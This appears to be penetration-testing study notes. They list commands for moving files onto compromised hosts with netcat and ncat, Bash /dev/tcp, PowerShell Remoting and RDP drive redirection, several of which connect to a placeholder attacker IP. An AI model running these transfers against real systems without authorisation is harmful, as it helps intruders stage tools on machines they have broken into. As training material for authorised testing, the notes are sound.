# Miscellaneous File Transfer Methods

## Netcat and Ncat

**Netcat (nc)** is a networking utility used for reading from and writing to network connections using TCP or UDP. **Ncat** is a modern reimplementation by the Nmap project that adds support for SSL, IPv6, SOCKS, and HTTP proxies.

### Technique Selection

|Tool|Use Case|Key Flags|
|:--|:--|:--|
|**Netcat (nc)**|Original version; widely available on older systems.|`-q 0`: Terminates the connection once the file transfer is finished.|
|**Ncat**|Modern version; supports advanced networking features.|`--send-only` / `--recv-only`: Forces the connection to close once input is exhausted or the file is received.|

---

### Scenario 1: Inbound Connections Allowed (Target Listening)

Use this method when the **target machine can accept incoming connections** on a specific port.

**Operational Workflow:**

1. **Target:** Start a listener and redirect output to a file.
2. **Attack Host:** Connect to the target listener and send the file as input.

#### Command Reference

|Goal|Tool|Command|
|:--|:--|:--|
|**Listen (Target)**|Netcat|`nc -l -p <PORT> > <FILENAME>`|
|**Listen (Target)**|Ncat|`ncat -l -p <PORT> --recv-only > <FILENAME>`|
|**Send (Attack Host)**|Netcat|`nc -q 0 <TARGET_IP> <PORT> < <FILENAME>`|
|**Send (Attack Host)**|Ncat|`ncat --send-only <TARGET_IP> <PORT> < <FILENAME>`|

---

### Scenario 2: Inbound Connections Blocked (Attacker Listening)

Use this method when a **firewall blocks inbound connections** to the compromised machine. This forces the target to initiate an outbound connection to your attack host.

**Operational Workflow:**

1. **Attack Host:** Start a listener and provide the file as input.
2. **Target:** Connect to the attack host and redirect the incoming stream to a file.

#### Command Reference

|Goal|Tool|Command|
|:--|:--|:--|
|**Listen (Attack Host)**|Netcat|`sudo nc -l -p <PORT> -q 0 < <FILENAME>`|
|**Listen (Attack Host)**|Ncat|`sudo ncat -l -p <PORT> --send-only < <FILENAME>`|
|**Receive (Target)**|Netcat|`nc <ATTACK_IP> <PORT> > <FILENAME>`|
|**Receive (Target)**|Ncat|`ncat <ATTACK_IP> <PORT> --recv-only > <FILENAME>`|

---

### Scenario 3: No Netcat/Ncat on Target (/dev/tcp)

If the compromised host lacks Netcat or Ncat, use **Bash pseudo-device files** to handle the transfer.

**Operational Workflow:**

1. **Attack Host:** Set up a listener as described in Scenario 2.
2. **Target:** Use Bash to connect to the attacker's IP/Port and redirect the input.

#### Command Reference

|Goal|Command|
|:--|:--|
|**Receive via Bash**|`cat < /dev/tcp/<ATTACK_IP>/<PORT> > <FILENAME>`|

---

## PowerShell Remoting (WinRM)

**PowerShell Remoting** (WinRM) is used for file transfers when standard protocols like **HTTP, HTTPS, or SMB are unavailable**. It typically runs on **TCP/5985 (HTTP)** or **TCP/5986 (HTTPS)**.

### Requirements for Attack Success

- **Administrative Access** on the target or membership in the **Remote Management Users** group.
- **WinRM enabled** on the target machine.

### Operational Workflow

1. **Verify Connectivity:** Confirm the WinRM port is open on the target.
2. **Create Session:** Establish a persistent PowerShell session to the target.
3. **Transfer File:** Use `Copy-Item` to move files between the local host and the session.

#### Command Reference

|Action|Command|
|:--|:--|
|**Check Port**|`Test-NetConnection -ComputerName <TARGET_IP> -Port 5985`|
|**Create Session**|`$Session = New-PSSession -ComputerName <TARGET_IP>`|
|**Upload File**|`Copy-Item -Path <LOCAL_PATH> -ToSession $Session -Destination <REMOTE_PATH>`|
|**Download File**|`Copy-Item -Path <REMOTE_PATH> -Destination <LOCAL_PATH> -FromSession $Session`|

---

## Remote Desktop Protocol (RDP)

RDP allows for file transfers via GUI interaction or resource redirection.

### Technique Selection

- **Copy/Paste:** Simplest method but may fail depending on the client or configuration.
- **Drive Redirection:** Mounts a local folder from the attack machine as a network drive on the target.

### Attack Implications

- **Security Isolation:** A redirected drive is **not accessible** to other users on the target computer, protecting your tools even if another user hijacks the session.
- **AV Detection:** If Windows Defender is active on the target, it may **delete malware** stored in your mounted local folder.

#### Command Reference (Linux Attack Host)

|Tool|Command|
|:--|:--|
|**rdesktop**|`rdesktop <TARGET_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -r disk:linux='<LOCAL_PATH>'`|
|**xfreerdp**|`xfreerdp /v:<TARGET_IP> /d:<DOMAIN> /u:<USERNAME> /p:'<PASSWORD>' /drive:linux,<LOCAL_PATH>`|

**Note:** Once connected via RDP, access the transferred files by navigating to **`\\tsclient`** in Windows File Explorer.